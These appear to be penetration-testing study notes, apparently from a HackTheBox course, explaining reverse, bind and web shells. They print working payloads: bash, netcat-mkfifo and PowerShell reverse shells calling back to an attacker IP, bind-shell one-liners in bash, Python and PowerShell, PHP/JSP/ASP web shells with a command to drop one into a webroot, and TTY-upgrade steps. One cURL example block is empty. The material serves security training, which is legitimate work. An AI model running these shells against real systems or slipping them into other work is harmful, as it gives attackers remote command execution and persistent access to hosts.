- There are three main types of shells:
	- **Reverse Shell:** Connects back to your system and gives you control through a reverse connection.
	- **Bind Shell:** Waits for you to connect and gives you control once you do.
	- **Web Shell:** Communicates through a web server. Accepts commands through HTTP parameters, executes them, and prints back to the output.
- ## [[Reverse Shell]]
	- ### [[Netcat Listener]]
		- A reverse shell is the most common type of shell, as it is the quickest and easiest method to gain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port.
		- With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e. Bash or PowerShell, to our netcat listener. This gives us a reverse connection to the system.
		- ```sh
		  nc -lvnp 1234
		  ```
		- | Flag | Description |
		  |------|-------------|
		  | `-l` | Listen mode, to wait for a connection to connect to us. |
		  | `-v` | Verbose mode, so that we know when we receive a connection. |
		  | `-n` | Disable DNS resolution and only connect from/to IPs, to speed up the connection. |
		  | `-p 1234` | Port number netcat is listening on, and the reverse connection should be sent to. |
		- Now that we have a listener, we can execute a reverse shell that connects to us.
	- ### Connect Back IP
		- We need to find our system's IP in order to send a reverse connection. We can find our IP with
		- ```sh
		  ip a
		  ```
		- In our example, the IP we are interested is under tun0, which is the HTB network we connected to through our VPN.
		- **Note:** We are connecting to the IP in `tun0` because we can only connect to HackTheBox boxes through the VPN connection, as they do not have 
		  internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.
	- ### Reverse Shell Command
		- The command we execute depends on what operating system the host runs and what applications we can access. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
		   page has a comprehensive list of reverse shell commands we can use that
		   cover a wide range of options depending on our compromised host.
		- Certain reverse shell commands are more reliable than others and can 
		  usually be attempted to get a reverse connection. The below commands are
		   reliable commands we can use to get a reverse connection, for `bash` on Linux compromised hosts and `Powershell` on Windows compromised hosts:
		- ```bash
		  bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
		  ```
		- ```bash
		  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
		  ```
		- ```powershell
		  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
		  ```
		- We can utilize the exploit we have over the remote host to execute one 
		  of the above commands, i.e., through a Python exploit or a Metasploit 
		  module, to get a reverse connection. Once we do, we should receive a 
		  connection in our `netcat` listener:
		- ```sh
		  nc -lvnp 1234
		  ```
		- ```output
		  listening on [any] 1234 ...
		  connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572
		  
		  id
		  uid=33(www-data) gid=33(www-data) groups=33(www-data)
		  ```
		- As we can see, after we received a connection on our `netcat` listener, we were able to type our command and directly get its output back, right in our machine.
		- A `Reverse Shell` is handy when we want to get a quick, reliable connection to our compromised host. However, a `Reverse Shell`
		  can be very fragile. Once the reverse shell command is stopped, or if 
		  we lose our connection for any reason, we would have to use the initial 
		  exploit to execute the reverse shell command again to regain our access.
	- ## [[Bind Shell]]
		- Another type of shell is a `Bind Shell`. Unlike a `Reverse Shell` that connects to us, we will have to connect to it on the `targets'` listening port.
		- Once we execute a `Bind Shell Command`, it will start listening on a port on the remote host and bind that host's shell, i.e., `Bash` or `PowerShell`, to that port. We have to connect to that port with `netcat`, and we will get control through a shell on that system.
		- ### Bind Shell Command
			- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) contains a nearly comprehensive list of ways to start a bind shell.
			  id:: 66e6ffef-6fc0-405e-8482-f2b16e3e304b
			- The following are reliable commands to do so:
			- ```bash
			  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
			  ```
			- ```python
			  python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
			  ```
			- ```powershell
			  powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
			  ```
		- ### Netcat Connection
			- We can connect with netcat via:
			- ```sh
			  nc 10.10.10.1 1234
			  ```
			- ```output
			  id
			  uid=33(www-data) gid=33(www-data) groups=33(www-data)
			  ```
			- Here, we directly connected to a bash session and can interact with the target directly. Unlike a reverse shell, if we loose our connection we can simply reconnect to the session. However, if the bind shell command is stopped for any reason, we would need to re-exploit the system to regain access.
		- ### Upgrading TTY
			- Once we connect to a shell through Netcat, we will notice that we can 
			  only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the  command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
			- There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
			- ```bash
			  python -c 'import pty; pty.spawn("/bin/bash")'
			  ```
			- After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
			- ```bash
			  ^z #This is what outputs when you hit ctrl+z
			  ```
			- ```bash
			  stty raw -echo
			  ```
			- ```bash
			  fg
			  ```
			- ```output
			  [Enter]
			  [Enter]
			  www-data@remotehost$
			  ```
			- Once we hit `fg`, it will bring back our `netcat` shell to the foreground. At this point, the terminal will show a blank line. We can hit `enter` again to get back to our shell or input `reset`
			  and hit enter to bring it back. At this point, we would have a fully 
			  working TTY shell with command history and everything else.
			- We may notice that our shell does not cover the entire terminal. To 
			  fix this, we need to figure out a few variables. We can open another 
			  terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:
			- ```sh
			  echo $TERM
			  ```
			- ```output
			  xterm-256color
			  ```
			- ```sh
			  stty size
			  ```
			- ```output
			  67 318
			  ```
			- The first command showed us the `TERM` variable, and the second shows us the values for `rows` and `columns`, respectively. Now that we have our variables, we can go back to our `netcat` shell and use the following command to correct them:
			- ```sh
			  export TERM=xterm-256color
			  ```
			- ```sh
			  stty rows 67 columns 318
			  ```
			- Once we do that, we should have a `netcat` shell that uses the terminal's full features, just like an SSH connection.
	- ## [[Web Shell]]
		- The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.
		- ### Writing a Web Shell
			- First of all, we need to write our web shell that would take our command through a `GET` request, execute it, and print its output back. A web shell script is  typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:
			- ```php
			  <?php system($_REQUEST["cmd"]); ?>
			  ```
			- ```jsp
			  <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
			  ```
			- ```asp
			  <% eval request("cmd") %>
			  ```
		- ### Uploading a Web Shell
			- Once we have our web shell, we need to place our web shell script into 
			  the remote host's web directory (webroot) to execute the script through 
			  the web browser. This can be through a vulnerability in an upload 
			  feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.
			- However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. 
			  So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
			- | Web Server | Default Webroot         |
			  |-------------|-------------------------|
			  | Apache      | /var/www/html/           |
			  | Nginx       | /usr/local/nginx/html/  |
			  | IIS         | `C:\inetpub\wwwroot\`     |
			  | XAMPP       | `C:\xampp\htdocs\`        |
			- We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:
			- ```bash
			  echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
			  ```
		- ### Accessing a Web Shell
			- Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use `?cmd=id` to execute the `id` command:
			- ```text
			  http://SERVER_IP:PORT/shell.php?cmd=id
			  ```
			- Another option is to use `cURL`:
			- ```bash
			  
			  ```
			- ```output
			  uid=33(www-data) gid=33(www-data) groups=33(www-data)
			  ```
			- As we can see, we can keep changing the command to get its output. A 
			  great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on `80` or `443`, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.
			- On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.